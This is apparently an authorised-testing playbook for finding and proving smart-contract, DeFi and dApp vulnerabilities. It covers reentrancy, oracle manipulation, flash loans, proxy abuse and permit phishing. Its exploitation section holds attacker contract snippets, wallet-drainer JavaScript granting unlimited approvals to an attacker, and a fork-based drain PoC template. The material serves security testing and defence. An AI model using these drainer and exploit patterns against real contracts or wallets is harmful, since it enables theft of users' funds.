# Web3 & Blockchain Security — Skill Playbook

**Mitre ATT&CK ID:** T1195 (Supply Chain Compromise)
**OWASP Mapping:** A03:2021 – Injection / A05:2021 – Security Misconfiguration
**Severity:** Critical / High
**Last Updated:** 2026-08-04

---

## Metadata

```yaml
skill_id: web3-security-v1
category: web3
author: HiveBreach
mitre_attack_id: T1195
owasp_mapping:
  - A03:2021-Injection
  - A05:2021-Security-Misconfiguration
tags:
  - blockchain
  - web3
  - smart-contract
  - defi
  - solidity
  - reentrancy
  - flash-loan
  - oracle-manipulation
  - front-running
  - wallet
  - bridge
  - mev
  - T1195
  - T1555.003
  - T1556
  - T1546
environments:
  - web3
  - blockchain
  - evm
  - defi
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Attack Surface Enumeration

Web3 targets expose several distinct attack surfaces, all of which must be mapped before exploitation:

| Surface | Description | Examples |
|---|---|---|
| Smart contracts | On-chain EVM/Solana/Vyper code | DEXs, lending pools, vaults, governance |
| dApp frontend | Browser JS interacting with wallet & RPC | Uniswap UI, wallet dashboards |
| Wallets | Client-side key/seed storage | Browser extensions, mobile wallets |
| RPC infrastructure | Node endpoints serving chain data | Infura, Alchemy, self-hosted nodes |
| Bridges | Cross-chain asset transfers | Lock-and-mint, burn-and-mint |
| Oracle networks | Off-chain price/data feeds | Chainlink, Pyth, TWAP aggregators |
| Governance | On-chain voting & proposal execution | Timelocks, DAOs |

### 1.2 Smart Contract Static Detection

**Source-code analysis (when available):**
```bash
# Slither: static analysis with detectors
slither contracts/ --detect reentrancy,suicidal,uninitialized-state \
  --json slither-report.json

# Mythril: symbolic execution for deeper paths
myth analyze contracts/Vault.sol --solc-json solc.json --execution-timeout 120

# solhint / ethlint: Solidity linters for code-quality findings
solhint "contracts/**/*.sol"
solium -d contracts/ -R soliumrc.json

# Solgraph: visual control-flow graph
slither contracts/ --print call-graph
```

**Bytecode-only analysis (verified/source-unavailable contracts):**
```bash
# Disassemble contract runtime bytecode
cast code 0xDEADBEEF... -r $RPC_URL > runtime.bin
cast disassemble runtime.bin > runtime.asm

# Panopticon / evm disassemblers for manual review
# Heuristically grep for dangerous opcodes in disassembly
grep -E "SSTORE|SLOAD|CALL|DELEGATECALL|SELFDESTRUCT|CALLCODE|CREATE2" runtime.asm

# Etherscan/Voyager bytecode + verified source compare
# Tools: dedicated decompilers (Pandora, Panoramix) for partial reconstruction
```

### 1.3 Dynamic / On-Chain Detection

**Event & state monitoring:**
```bash
# Detect abnormal approve() activity (token approval abuse)
cast logs "Approval(address indexed,address indexed,uint256)" --from-block 18000000 -r $RPC_URL

# Detect large token movements to/from bridges
cast logs "Transfer(address indexed,address indexed,uint256)" --from-block 18000000 -r $RPC_URL

# Monitor mempool for front-running / sandwich patterns
# (requires archival node or MEV observer feed)
```

### 1.4 dApp Frontend Detection

| Indicator | Likely Finding |
|---|---|
| Domain typosquats valid dApp (`.com` vs `.net`) | Wallet drainer / phishing site |
| JS pulls wallet-drainer libs (e.g. `wallet-drainer`, `approve` drains) | Malicious approve() frontend |
| Site requests `eth_sign` / `personal_sign` of arbitrary hashes | Signature phishing |
| Site asks for seed phrase "verification" | Seed phrase phishing |
| Injected scripts in XSS-able dApp pages | Malicious contract interaction |

**Detection commands:**
```bash
# Download and inspect a dApp bundle for wallet drainer signatures
curl -s https://target-dapp.com/js/app.bundle.js -o app.js
grep -oE "eth_sendTransaction|eth_signTypedData|personal_sign|approve\(|permit\(" app.js | sort | uniq -c

# Check for injected drainer libs via content hash comparison
# (compare CDN-delivered bundle vs npm-published source)
```

---

## 2. Confirmation

### 2.1 Confirm Contract Behaviour

| Behaviour | Probable Vulnerability |
|---|---|
| ETH/ERC20 balance updated before external call | Reentrancy candidate |
| External `.call()` / `.transfer()` in the middle of state changes | Reentrancy / unchecked call |
| `tx.origin` used for auth | tx.origin phishing |
| `block.timestamp`, `block.number`, `blockhash` used for logic | Timestamp dependency / randomness |
| Values from oracle used in pricing without bounds | Oracle manipulation |
| `delegatecall` to user-controlled address | Proxy / storage collision |
| Unchecked arithmetic (Sol `>=0.8` auto-checks; `<0.8` vulnerable) | Integer overflow/underflow |
| `selfdestruct` reachable by non-owner | Suicidal / forced ETH |
| Mutable slot/implementation addresses | Malicious upgrade path |

### 2.2 Confirm Storage & ABI
```bash
# Read storage slots to confirm live state (Proxy, balances)
cast storage 0xCONTRACT 0 -r $RPC_URL

# Recover function signatures / ABI from bytecode
cast selectors --resignatures 0xDEADBEEF... 
cast 4byte 0xa9059cbb
```

### 2.3 Confirm Frontend / Wallet Layer

| Behaviour | Confirmed Finding |
|---|---|
| Wallet-drainer payload executes in console | Malicious approve() / transferFrom drain |
| Signature request hash is not what UI shows | Signature phishing (EIP-2612 permit) |
| Seed phrase requested in plaintext | Seed phrase phishing |
| RPC returned wrong/reordered data | Malicious RPC / censorship |

### 2.4 Reproduce in Isolation
- Compile the exact contract revision with pinned compiler + optimizer settings
- Fork mainnet with Anvil and replay the attacker's transactions byte-for-byte
- Confirm the vulnerable function is reachable and the state delta is as expected

---

## 3. Exploitation

### 3.1 Reentrancy (Classic)

The contract makes an external call **before** updating its internal balance state:

```solidity
// Vulnerable contract (withdrawal pattern)
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    (bool ok, ) = msg.sender.call{value: amount}("");  // state not yet updated
    require(ok);
    balances[msg.sender] -= amount;                    // too late
}
```

```solidity
// Attacker contract
receive() external payable {
    if (address(victim).balance >= amount) {
        victim.withdraw(amount);   // re-enter before balances update
    }
}
```

**Read-only reentrancy variant:** even when state is updated safely, a second contract (e.g. a price view, accounting read) that re-enters the vulnerable contract can read stale state. Used to manipulate prices/liquidity views that external contracts rely on.

**Gas optimization / view reentrancy:** functions marked `view` cannot be guarded by modifiers that write storage; a `view` function that reads a snapshot updated later can observe inconsistent state.

### 3.2 Integer Overflow / Underflow

Only affects Solidity `<0.8.0` (pre-checked arithmetic) or uses of `unchecked {}` / assembly. Classic exploit:

```solidity
// Pre-0.8: unchecked arithmetic allows wrap
function burn(uint256 amount) external {
    balances[msg.sender] -= amount;  // underflow if balance < amount
    totalSupply -= amount;
}
```

Exploit: call with `amount > balance` to inflate balance, then transfer/withdraw real funds. Modern contracts require finding `unchecked` blocks or `uint` wrappers introduced by `SafeMath`-removal refactors.

### 3.3 Flash Loan Attacks

Flash loans provide uncollateralised capital within a single transaction — used to amplify any economic attack:

1. Flash-borrow large liquidity (Aave/Uniswap V3/Balancer).
2. Execute the economic attack (price manipulation, liquidation of victim positions, draining an under-collateralised pool).
3. Repay loan + fee in the same tx; attacker never risks capital.

**Typical targets:** oracle price manipulation, illiquid pool drains, liquidation bots with stale oracles, governance proposals (flash-proposal voting).

### 3.4 Oracle Manipulation

If pricing reads a spot value from a pool the attacker can move in the same tx:

```solidity
uint256 price = pool.getPriceOf(tokenA);   // manipulable spot TWAP-without-window
```

Exploit pattern: large swap moves `reserveA/reserveB`, borrowing/repaying against the inflated collateral, profiting before the price reverts. **Mitigation to test for:** TWAP windows, multiple independent oracles, deviation thresholds.

### 3.5 tx.origin Phishing

```solidity
function withdrawAll() external {
    require(tx.origin == owner);  // weak auth
    msg.sender.call{value: address(this).balance}("");
}
```

Chain: victim is tricked into calling attacker contract → attacker contract calls `victim.withdrawAll()` → `tx.origin` is still the victim → funds drain. Replace with `msg.sender` checks.

### 3.6 Front-Running / Sandwich

1. Victim submits a large swap to the mempool.
2. Attacker bot places a buy order before the victim's tx (front-run).
3. Victim's tx executes at the inflated price.
4. Attacker sells at the top (back-run), capturing the price slippage.

Manual approach with a flashbots-style relayer or mempool watcher; for authorised testing, demonstrate with a local fork and mined-tx ordering.

### 3.7 Unchecked External Calls

```solidity
(bool success, ) = addr.call{value: amount}("");  // success ignored
```

Ignoring `success` silently swallows failures. If token transfer fails but the ledger records success, accounting breaks → drained over time.

### 3.8 delegatecall / Proxy Attacks

```solidity
function execute(address target, bytes memory data) external {
    target.delegatecall(data);  // executes in caller's storage context
}
```

- Storage collision between proxy and implementation can overwrite `implementation` slot → arbitrary code.
- `delegatecall` to a user-controlled address = arbitrary contract code in proxy context.
- Uninitialised proxy implementation: call implementation directly, `initialize()` it, then have the proxy delegate to attacker-owned storage.

### 3.9 selfdestruct / Forced ETH

```solidity
function kill() external { selfdestruct(payable(owner)); }   // if not owner-guarded
```

- `selfdestruct` sends the entire contract balance to the target, **bypassing** any `receive()` guards and `address(this).balance` assumptions (breaking the invariant that a contract's balance is only increased via its deposit path).
- Malicious contracts can force ETH into contracts that do not implement `receive()`.

### 3.10 Wallet & Key Layer Exploitation

| Vector | Chain |
|---|---|
| Private key leakage (hardcoded, logs, pasted to chat) | Direct funds theft |
| Seed phrase phishing (fake support, airdrop sites) | Full wallet takeover |
| Malicious browser extension reading localStorage/extension storage | Key exfiltration (T1555.003) |
| Clipboard hijacking (address substitution) | Funds sent to attacker address |
| RPC endpoint tampering (censorship, malicious node) | Wrong chain/data, double-spend, MEV theft |

### 3.11 RPC Endpoint Attacks (Bad RPC)

- **Censorship:** node refuses to broadcast victim txs or blocks them (doS on the user's actions).
- **Malicious data:** node returns fabricated state/headers (e.g. fake balance, fake receipts).
- **Key theft:** malicious provider logs signed txs, replays them, or front-runs them for MEV.
- **Chain confusion:** serves the wrong chain id so approvals/sends target attacker-controlled forks.

Test by running the target dApp against a compromised RPC in a sandbox and observing state divergence.

### 3.12 Bridges

| Vulnerability | Effect |
|---|---|
| Weak validator set / single signer | Unauthorised mint of wrapped assets |
| Unclaimed/known funds (locked liquidity) | Arbitrage/drain of bridge vault |
| Message relaying without replay protection | Double-mint / replay across chains |
| Malicious upgrade of bridge contract | Steal all locked assets |
| Nonce/hash collision in deposit messages | Free mint |

Bridge PoCs typically chain a protocol flaw on one side with a mint on the other — verify each leg separately in sandbox chains.

### 3.13 MEV Extraction

- **Sandwich** — described in 3.6.
- **Liquidation sniping** — racing to liquidate under-collateralised positions first.
- **JIT liquidity** — adding/removing LP around large swaps to capture fee-to-LP.
- **Back-running** — executing trades that benefit from a victim's pending tx.

For authorised tests: quantify max-extractable value (MEV) with simulation tooling (foundry fork + mempool inspection), never extract on live mainnet.

### 3.14 dApp Frontend: Wallet Drainer / Malicious approve()

```javascript
// Wallet drainer pattern (delivered via phishing site or XSS)
await web3.eth.sendTransaction({
  from: wallet,
  to: drainerContract,
  data: drainerInterface.methods.steal().encodeABI(),
  gas: 210000
});
// OR: force infinite approve() to attacker spender
await token.methods.approve(attackerSpender, ethers.constants.MaxUint256).send({from: wallet});
```

### 3.15 Signature Phishing (EIP-2612 permit)

`permit()` lets anyone move tokens using an off-chain signature, no `approve()` tx required:

```solidity
token.permit(owner, spender, amount, deadline, v, r, s);
// spender can then transferFrom(owner, attacker, amount)
```

Attack: victim signs what they believe is a harmless message; attacker replays the signature to call `permit()` + `transferFrom()` and drains tokens (including NFTs via EIP-4494). Verify what a wallet shows vs the hash actually signed (TypedData domains, nonce, deadline).

### 3.16 Token Approval Abuse

- Infinite allowances (`MaxUint256`) left to compromised/exposed spender contracts.
- Allowances granted to upgradable proxies whose implementation later changes.
- `transferFrom` abuse after an `approve` to a malicious spender.

---

## 4. Tool-Specific Guidance

### 4.1 Slither (Static Analysis)
```bash
# Install
pip3 install slither-analyzer

# Run all default detectors
slither contracts/ --json report.json

# Targeted detector sets
slither . --detect reentrancy-eth,reentrancy-no-eth,suicidal,uninitialized-state \
  --exclude-dependencies

# Slither prints (graph / inheritance / data dependency)
slither . --print human-summary
slither . --print call-graph
```

### 4.2 Mythril (Symbolic Execution)
```bash
pip3 install mythril

# Analyse with solc-json
myth analyze contracts/Vault.sol --solc-json solc.json --execution-timeout 120

# Test from a specific entry function with a state dictionary
myth analyze contracts/Vault.sol --solc-json solc.json \
  --function withdraw --tx-count 5
```

### 4.3 Echidna (Property Fuzzing)
```solidity
// echidna.properties.sol — invariant test
function echidna_test_balance_never_decreases() public returns (bool) {
    return address(this).balance >= initialBalance;
}
```
```bash
echidna contracts/ --contract Vulnerable \
  --config echidna.yaml --test-mode property --test-limit 100000
```

### 4.4 Foundry (forge / anvil / cast / chisel)

**Fork mainnet into a sandbox:**
```bash
anvil --fork-url $MAINNET_RPC --fork-block-number 18000000 \
  --chain-id 31337 --port 8545

# Whitelisted fork cheatcodes via forge test
forge test --fork-url $MAINNET_RPC --fork-block-number 18000000 -vvv
```

**Cast — on-chain recon:**
```bash
cast call 0xPOOL "getReserves()" -r $RPC_URL
cast storage 0xCONTRACT 0 -r $RPC_URL
cast code 0xCONTRACT -r $RPC_URL | wc -c
cast disassemble $(cast code 0xCONTRACT -r $RPC_URL)
cast 4byte 0xa9059cbb
```

**Chisel — Solidity REPL for quick contract snippets:**
```bash
chisel
> uint256 a = 2**255; uint256 b = a + a; // unchecked? -> observe behaviour
```

### 4.5 Hardhat
```bash
npm init -y && npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox
npx hardhat compile

# Forked mainnet testing
npx hardhat test --fork https://eth-mainnet.g.alchemy.com/v2/$KEY

# Console REPL with network attached
npx hardhat console --network hardhat
```

### 4.6 Brownie (Python)
```bash
pip3 install eth-brownie
brownie init
brownie compile
brownie test --fork https://eth-mainnet.g.alchemy.com/v2/$KEY
brownie console --network mainnet-fork
```

### 4.7 web3.py
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))  # anvil fork
assert w3.is_connected()
acct = w3.eth.account.from_key("0xPRIVATE_KEY")
tx = {"from": acct.address, "to": "0xCONTRACT", "value": 0,
      "data": "0x..."}
w3.eth.send_transaction(tx)
```

### 4.8 Waffle / Ganache (legacy tooling)
```bash
# Ganache: local blockchain for deterministic tests
ganache --fork https://eth-mainnet.g.alchemy.com/v2/$KEY --port 8545

# Waffle: Mocha/Chai-based contract tests
npx waffle --solc-version 0.8.20 compile contracts/ -o build/
```

### 4.9 Linters / Compilers
```bash
solhint "contracts/**/*.sol" --config .solhint.json   # style + security rules
solium -d contracts/                                  # legacy ethlint
solc --bin --abi --optimize contracts/Vault.sol       # compile pinned version
```

---

## 5. PoC Generation

Every finding must produce a reproducible, executable PoC — the default format is a **Foundry test against a forked mainnet**, with Hardhat/Brownie variants where the project already uses them.

### Foundry PoC Template

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";

interface IVictim {
    function withdraw(uint256 amount) external;
}

contract ReentrancyPoC is Test {
    IVictim victim;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet at the block where the vulnerability exists
        vm.createSelectFork(vm.envString("MAINNET_RPC"), 18000000);
        victim = IVictim(0xTARGET_CONTRACT);
    }

    function test_ReentrancyDrain() public {
        // fund attacker
        deal(address(this), 10 ether);
        // attacker calls vulnerable withdraw, reentrant receive drains pool
        vm.prank(attacker);
        victim.withdraw(1 ether);
        assertGt(attacker.balance, expectedBalance);
    }
}
```

```bash
forge test --match-contract ReentrancyPoC -vvv
```

### PoC Report Template

```markdown
## Reentrancy (Classic) — [FINDING_ID]

**Contract:** 0xTARGET_CONTRACT @ block 18000000
**Function:** withdraw(uint256)
**Severity:** Critical
**Root Cause:** External call to msg.sender before balances[msg.sender] decrement

### Attack Flow
1. Attacker contract deposits 1 ETH.
2. Attacker calls `withdraw(1 ether)`.
3. `receive()` on attacker re-enters `withdraw` before balance update.
4. Repeat until `address(this).balance == 0`.

### Evidence
- forge test output showing attacker balance increase
- tx hash on anvil fork
- state diff (before/after)

### Impact
- Complete drain of pool: 1,204 ETH (~$X at block price)
- Permanently breaks token peg of dependent pools

### Remediation
- Checks-Effects-Interactions ordering (state before external call)
- ReentrancyGuard (nonReentrant modifier)
- Use pull-payment patterns / `transfer` deprecation awareness
- Static analysis gates (slither reentrancy detector) in CI

### Reproduction
1. `forge test --match-contract ReentrancyPoC -vvv`
```

---

## 6. Verification (Sandbox)

All Web3 exploitation **must** be verified in a sandbox. Mainnet is strictly off-limits for any state-changing exploitation (HiveBreach rules R3/R5).

### Sandbox Checklist
- [ ] Anvil fork of mainnet at a pinned block (deterministic state)
- [ ] Local chain / testnet (Sepolia, Goerli, local Anvil) for state-changing PoCs
- [ ] Testnet faucet funding for deployment testing
- [ ] Etherscan/tools pointed at the fork, never live production RPC
- [ ] PoC replayable (fixed block number, fixed accounts, fixed inputs)
- [ ] No real tokens moved; wrapper/test tokens only
- [ ] Impact quantified via simulation, not live execution

### Allowed Sandbox Environments
| Environment | Use |
|---|---|
| `anvil --fork-url` mainnet fork | Read-state + simulation + PoC dev |
| Local `ganache`/`anvil` chain | Deterministic fresh-chain tests |
| Testnets (Sepolia, etc.) | Deployment + end-to-end with faucet funds |
| Hardhat/Brownie `fork` tasks | Project-native test runs |

### Prohibited Actions
- Any state-changing tx against mainnet or production RPC
- Real token transfers / approvals on live assets
- Executing MEV strategies on a live mempool
- Deploying drainer/exploit payloads to any real network
- Simulating attacks against unauthorised live contracts

---

## 7. SWC / Vulnerability Classification Reference

| SWC | Name | Detection Tool |
|---|---|---|
| SWC-107 | Reentrancy | slither, mythril, manual review |
| SWC-101 | Integer Overflow / Underflow | slither, mythril |
| SWC-104 | Unchecked Call Return Value | slither, mythril |
| SWC-103 | Floating Pragma | solhint, slither |
| SWC-102 | Outdated Compiler Version | slither, solhint |
| SWC-105 | Unprotected Ether Withdrawal | slither, mythril |
| SWC-106 | Unprotected SELFDESTRUCT | slither, mythril |
| SWC-108 | State Variable Default Visibility | slither, solhint |
| SWC-109 | Uninitialised Storage Pointer | slither, mythril |
| SWC-110 | Assertion / require() Failure | mythril, manual |
| SWC-112 | tx.origin Usage | slither, manual |
| SWC-114 | Transaction Ordering Dependence | manual, MEV sim |
| SWC-118 | Incorrect Constructor Name | slither, solhint |
| SWC-119 | Shadowing State Variables | slither, solhint |
| SWC-123 | Requirement Violation | mythril, manual |
| SWC-128 | DoS With Block Gas Limit | manual, echidna |
| SWC-131 | Presence of Unused Variables | solhint, slither |
| SWC-135 | Code With No Effects | slither |
| SWC-136 | Unlocked Compiler Version | solhint |

### Tool → Vulnerability Coverage Matrix

| Tool | Type | Best At |
|---|---|---|
| Slither | Static analysis | Reentrancy, unchecked calls, tx.origin, shadowing |
| Mythril | Symbolic execution | Deep path exploration, arithmetic issues |
| Echidna | Property fuzzing | Invariant breaks, state-machine failures |
| Foundry (forge/anvil/cast/chisel) | Testing/simulation | PoC development, fork verification, MEV sim |
| Hardhat / Brownie | Dev + testing | Project-native PoCs, fork tests |
| web3.py / ethers | Scripting | Interaction harnesses, data exfil |
| Waffle | Unit testing | Legacy EVM test suites |
| Ganache | Local chain | Deterministic chain state |
| solhint / ethlint | Linting | Style + basic security rules |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1195 | Supply Chain Compromise | Primary (malicious contracts, libs, dApp supply chain) |
| T1195.002 | Compromise Software Supply Chain | Malicious npm/npm-dapp deps |
| T1555.003 | Credentials from Web Browsers | Wallet extension/private key exfil |
| T1556 | Modify Authentication Process | Backdoored wallet/RPC auth flow |
| T1546 | Event Triggered Execution | Malicious approve/permit hooks |
| T1539 | Steal Web Session Cookie | dApp session theft |
| T1204.002 | User Execution: Malicious File | Wallet-drainer JS execution |
| T1566 | Phishing | Seed phrase / signature phishing |
| T1203 | Exploitation for Client Execution | Frontend exploit chain |
| T1657 | Financial Theft | End-state impact for all wallet/DeFi attacks |
| T1565 | Data Manipulation | Oracle manipulation / fake RPC state |
| T1190 | Exploit Public-Facing Application | Bridge/API exploitation |

---

## 9. References

- SWC Registry (Smart Contract Weakness Classification): https://swcregistry.io/
- Consensys Diligence: https://consensys.net/diligence/
- Trail of Bits (Slither/Mythril/Echidna): https://www.trailofbits.com/
- Daemon Technologies (audits): https://www.daemontechnologies.co/
- OWASP Web3 Security Top 10: https://owasp.org/www-project-web3-security/
- Foundry Book (forge/anvil/cast/chisel): https://book.getfoundry.sh/
- Slither docs: https://github.com/crytic/slither
- Mythril docs: https://mythril-classic.readthedocs.io/
- Echidna docs: https://github.com/crytic/echidna
- Hardhat docs: https://hardhat.org/hardhat-runner/docs
- Brownie docs: https://eth-brownie.readthedocs.io/
- EIP-2612 permit: https://eips.ethereum.org/EIPS/eip-2612
- rekt.news (real-world exploits): https://rekt.news/
- ChainLight / Secureum vaults (Web3 CTFs): https://secureum.substack.com/
- MITRE ATT&CK T1195: https://attack.mitre.org/techniques/T1195/
- MITRE ATT&CK T1555.003: https://attack.mitre.org/techniques/T1555/003/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments — never on mainnet or against live production assets. Unauthorised use against real networks is illegal and strictly prohibited.*
